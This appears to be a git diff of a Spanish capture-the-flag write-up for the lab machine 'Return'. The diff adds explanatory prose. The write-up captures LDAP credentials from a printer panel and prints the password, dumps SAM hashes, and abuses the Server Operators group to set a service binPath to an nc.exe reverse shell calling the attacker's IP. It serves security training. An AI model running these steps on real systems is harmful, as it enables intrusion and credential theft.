@@ -1,4 +1,5 @@
 ---
+icon: desktop
 layout:
   title:
     visible: true
@@ -14,7 +15,15 @@ layout:
 
 # Return
 
+`Return` es una máquina Windows de dificultad fácil que cuenta con un panel de administración de impresoras de red que almacena credenciales LDAP. Estas credenciales se pueden capturar ingresando un servidor LDAP malicioso que permite obtener acceso al servidor a través del servicio WinRM. Se descubrió que el usuario formaba parte de un grupo de privilegios que luego se explotó para obtener acceso al sistema.
 
+<figure><img src="../../../.gitbook/assets/Return.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+## Reconnaissance
+
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Return**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.108 -oG allPorts
@@ -53,7 +62,7 @@ PORT      STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 39.71 seconds
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -66,7 +75,7 @@ Nmap done: 1 IP address (1 host up) scanned in 39.71 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos.
 
 ```bash
 ❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49699 10.10.11.108 -A -oN targeted -oX targetedXML
@@ -135,7 +144,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 92.93 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -144,40 +153,38 @@ Nmap done: 1 IP address (1 host up) scanned in 92.93 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
-
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../../.gitbook/assets/4024_vmware_MyD0Xu1K2a.png" alt=""><figcaption></figcaption></figure>
 
+## Initial Access
 
+### Abusing Printer Admin Panel
+
+Accederemos a [http://10.10.11.108](http://10.10.11.108) y nos encontramos que se trata de un panel de administración de una impresora.
 
 <figure><img src="../../../.gitbook/assets/4025_vmware_vhgwpjSIeH.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+En el apartado de `Settings`, logramos visualizar el siguiente contenido. Una dirección de servidor, puerto, usuario y unas credenciales en \*\*\*\*\*.
 
 <figure><img src="../../../.gitbook/assets/4026_vmware_kJb5FWKsWh.png" alt=""><figcaption></figcaption></figure>
 
+Probamos de verificar si estas credenciales estaban en formato `password` en el código, nos encontramos que es una cadena en formato `text`, por lo tanto no podemos realizar nada al respecto.
 
+<figure><img src="../../../.gitbook/assets/4027_vmware_ICMvVZvk66.png" alt="" width="500"><figcaption></figcaption></figure>
 
-
-
-<figure><img src="../../../.gitbook/assets/4027_vmware_ICMvVZvk66.png" alt=""><figcaption></figcaption></figure>
-
-
+También verificamos que podemos modificar parte de las opciones que nos proporcionan. Por lo tanto, lo que probaremos es de ponernos en escucha por el puerto 389 que es el que está especificado en la impresora.
 
 ```bash
 ❯ nc -nlvp 389
 listening on [any] 389 ...
 ```
 
-
+Volveremos al panel de adminsitración, y cambiaremos el `Server Address` por nuestra dirección IP, actualizaremos la configuración.
 
 <figure><img src="../../../.gitbook/assets/4028_vmware_69gNXweD3d.png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que recibimos la autenticación del usuario `svc-printer` con su contraseña. Al modificar el `Server Address` por el nuestro, la impresora ha realizado la autenticación en nuestro equipo, mostrándonos las credenciales en texto plano al no haber un LDAP por atrás que valide estas credenciales.
 
 ```bash
 ❯ nc -nlvp 389
@@ -187,7 +194,9 @@ connect to [10.10.16.5] from (UNKNOWN) [10.10.11.108] 58464
                        1edFg43012!!
 ```
 
+### Abusing WinRM - EvilWinRM
 
+Verificaremos si estas credenciales son válidas para el usuario. Verificamos que logramos comprobar y también conectarnos al equipo mediante `evil-winrm` y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ nxc smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
@@ -204,14 +213,14 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> type ../Desktop/user.txt
-7f9f0efb4bc73eac6e76d9d2eca825bd
+7f9f0efb4b**********************
 ```
 
+## Privilege Escalation
 
+Comprobaremos los permisos y grupos que dispone el usuario `svc-printer`. En el resultado obtenido, logramos verificar que este usuario tiene el privilegio de `SeBackupPrivilege` habilitado.
 
-
-
-```bash
+```powershell
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /all
 
 USER INFORMATION
@@ -265,9 +274,13 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
+### Dumping Credentials - SAM File Hashes (SeBackup Privilege) \[FAILED]
 
+Probaremos de hacer un dump de la SAM para extraer el hash NTLM del usuario Administrator y verificar si nos sirve para ser usuarios administradores locales del equipo.
 
-```bash
+Exportaremos la `SAM` y `SYSTEM` y nos lo descargaremos en nuestro equipo local.
+
+```powershell
 *Evil-WinRM* PS C:\Temp> reg save HKLM\SAM C:\Temp\SAM
 The operation completed successfully.
 
@@ -299,7 +312,7 @@ Info: Downloading C:\Temp\SYSTEM to SYSTEM
 Info: Download successful!
 ```
 
-
+A través de la herramienta de `samdump2`, extraemos los hashes NTLM de la `SAM`.
 
 ```bash
 ❯ samdump2 SYSTEM SAM
@@ -309,7 +322,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 *disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
-
+Verificaremos si el hash NTLM del usuario `Administrator` es válido. En este caso, no nos sirve el hash encontrado.
 
 ```bash
 ❯ nxc smb 10.10.11.108 -u 'Administrator' -H '31d6cfe0d16ae931b73c59d7e0c089c0'
@@ -317,9 +330,30 @@ SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019
 SMB         10.10.11.108    445    PRINTER          [-] return.local\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
 ```
 
+### Abusing Server Operators Group
 
+Revisando nuevamente los grupos a los cuales forma parte este usuario. Nos fijamos que forma parte del grupo `Server Operators`.
 
-```bash
+El grupo `Server Operators` es un grupo de seguridad integrado en los entornos de Windows Server. A los miembros de este grupo se les otorgan privilegios administrativos específicos que les permiten realizar tareas relacionadas con el servidor sin tener derechos administrativos completos. Este grupo está diseñado principalmente para la administración delegada del servidor. Privilegios clave de los operadores de servidor
+
+Los miembros del grupo Operadores de servidor tienen los siguientes privilegios:
+
+* **Iniciar y detener servicios:**
+  * Pueden iniciar, detener y pausar servicios en el servidor, lo que es crucial para el mantenimiento y la resolución de problemas del servidor.
+* **Administrar recursos compartidos:**
+  * Los operadores de servidor pueden crear, modificar y eliminar carpetas compartidas y administrar recursos compartidos de impresoras, lo que les permite administrar recursos compartidos de manera eficaz.
+* **Operaciones de copia de seguridad y restauración:**
+  * Los miembros pueden realizar copias de seguridad de archivos y restaurar archivos a partir de copias de seguridad, lo que facilita la administración de los procesos de recuperación de datos.
+* **Iniciar sesión localmente:**
+  * Los miembros tienen la capacidad de iniciar sesión localmente en el servidor, lo que les permite administrar directamente el servidor a través de su consola.
+* **Administrar usuarios y grupos locales:**
+  * Pueden agregar o eliminar usuarios de grupos locales y administrar cuentas locales, lo que es importante para las tareas de administración de usuarios.
+
+Hemos conseguido más información de lo que trata esta escalada de privilegios desde el siguiente blog donde se detalla la explotación.
+
+{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/" %}
+
+```powershell
 *Evil-WinRM* PS C:\Temp> whoami /groups
 
 GROUP INFORMATION
@@ -340,9 +374,9 @@ NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandato
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 ```
 
+Desde el equipo procederemos a revisar los servicios que se encuentran en ejecución.
 
-
-```bash
+```powershell
 *Evil-WinRM* PS C:\Temp> services
 
 Path                                                                                                                 Privileges Service          
@@ -360,11 +394,9 @@ C:\Windows\servicing\TrustedInstaller.exe                                       
 "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
 ```
 
+Después de revisar los servicios que se encuentran en ejecución, el siguiente paso será subir al equipo víctima el binario `nc.exe` para posteriormente aprovechar de que formamos parte de este grupo, para modificar el `binPath` del servicio e indicarle que la ruta del servicio es la ejecución de una Reverse Shell utilizando el binario subido de `nc.exe`.
 
-
-
-
-```bash
+```powershell
 *Evil-WinRM* PS C:\Temp> ls
 
 
@@ -378,23 +410,23 @@ Mode                LastWriteTime         Length Name
 Evil-WinRM* PS C:\Temp>
 ```
 
+Verificamos que logramos modificar correctamente el `binPath` del servicio `VMTools`, también podemos utilizar el servicio `browser`.
 
-
-```bash
+```powershell
 *Evil-WinRM* PS C:\Temp> sc.exe config VMTools binPath="C:\Temp\nc.exe -e cmd 10.10.16.5 443"
 [SC] ChangeServiceConfig SUCCESS
 ```
 
-
+En una terminal nos pondremos en escucha por el puerto especificado en el punto anterior.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 443
 listening on [any] 443 ...
 ```
 
+Volveremos a la terminal del equipo víctima y procederemos a parar y volver a iniciar el servicio el cual hemos modificado el `binPath` para que ejecute la Reverse Shell.
 
-
-```bash
+```powershell
 *Evil-WinRM* PS C:\Temp> sc.exe stop VMTools
 
 SERVICE_NAME: VMTools
@@ -407,7 +439,9 @@ SERVICE_NAME: VMTools
 *Evil-WinRM* PS C:\Temp> sc.exe start VMTools
 ```
 
+Verificamos que al volver a iniciar el servicio, hemos logrado obtener conexión a través de la Reverse Shell, en este caso, el usuario que arranca el servicio es el usuario `NT AUTHORITY\SYSTEM`, lo cual tenemos control total sobre el equipo.
 
+Logramos visualizar la flag de **root.txt**.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 443
@@ -418,5 +452,5 @@ Microsoft Windows [Version 10.0.17763.107]
 
 C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
-00ac8a0f81b31eb52b029520dd49b386
+00ac8a0f81**********************
 ```
